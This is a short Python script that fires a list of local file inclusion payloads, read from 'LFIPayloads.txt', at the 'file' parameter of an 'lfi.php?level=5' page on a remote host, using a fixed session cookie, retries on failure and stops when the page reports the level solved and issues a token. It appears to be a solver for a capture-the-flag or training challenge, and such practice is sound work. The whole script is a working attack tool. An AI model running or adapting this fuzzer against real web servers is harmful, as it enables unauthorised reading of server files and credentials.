import requests
import time

url = "http://57zg.l.time4vps.cloud/lfi.php?level=5"
cookies = {"PHPSESSID": "vft1mal4vpa91t182h424qds57"}

with open('LFIPayloads.txt', 'r') as f:
    payloads = f.read().splitlines()

for payload in payloads:
    params = {
        "level": "5",
        "file": payload
    }
    max_retries = 3
    retry_delay = 2  # seconds

    for i in range(max_retries):
        try:
            response = requests.get(url, cookies=cookies, params=params, timeout=10)
            break
        except requests.exceptions.RequestException as e:
            print(f"Request failed with error: {e}. Retrying...")
            time.sleep(retry_delay)
    else:
        print(f"Max retries exceeded. Giving up on payload: {payload}")
        continue

    success_message = "Correct, you solved it!"
    token_message = "Your token is valid for 10 minutes from now:"

    if success_message in response.text and token_message in response.text:
        print("Success Message:")
        print(response.text)
        break
